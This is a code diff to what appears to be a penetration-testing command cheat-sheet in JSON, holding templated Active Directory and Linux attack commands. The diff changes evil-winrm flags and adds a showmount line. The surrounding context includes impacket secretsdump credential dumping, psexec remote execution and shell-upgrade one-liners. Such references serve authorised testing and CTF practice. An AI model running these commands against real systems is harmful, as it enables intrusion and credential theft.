@@ -85,7 +85,7 @@
       "./username-anarchy --input-file users.txt --select-format first,firstlast,first.last,firstlast[8],first[4]last[4],firstl,f.last,flast,lfirst,l.first,lastf,last,last.f,last.first,FLast,first1,fl,fmlast,firstmiddlelast,fml,FL,FirstLast,First.Last,Last > anarchy_users.txt"
     ],
     "post-exploitation": [
-      "evil-winrm -i {{DC.DOMAIN}} -K -u {{USER}} -R {{DOMAIN}}",
+      "evil-winrm -i {{DC.DOMAIN}} -k -u {{USER}} -r {{DOMAIN}}",
       "impacket-mssqlclient -K '{{DOMAIN}}/{{USER}}@{{DC.DOMAIN}}' -no-pass",
       "impacket-psexec -k -no-pass '{{DOMAIN}}/{{USER}}@{{DC.DOMAIN}}'",
       "impacket-secretsdump -k -no-pass {{DOMAIN}}/{{USER}}@{{DC.DOMAIN}}",
@@ -121,7 +121,8 @@
       "getcap -r / 2>/dev/null",
       "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
       "script /dev/null -c /bin/bash",
-      "stty raw -echo; fg"
+      "stty raw -echo; fg",
+      "showmount -e {{DOMAIN}}"
     ]
   },
   "revshell": {
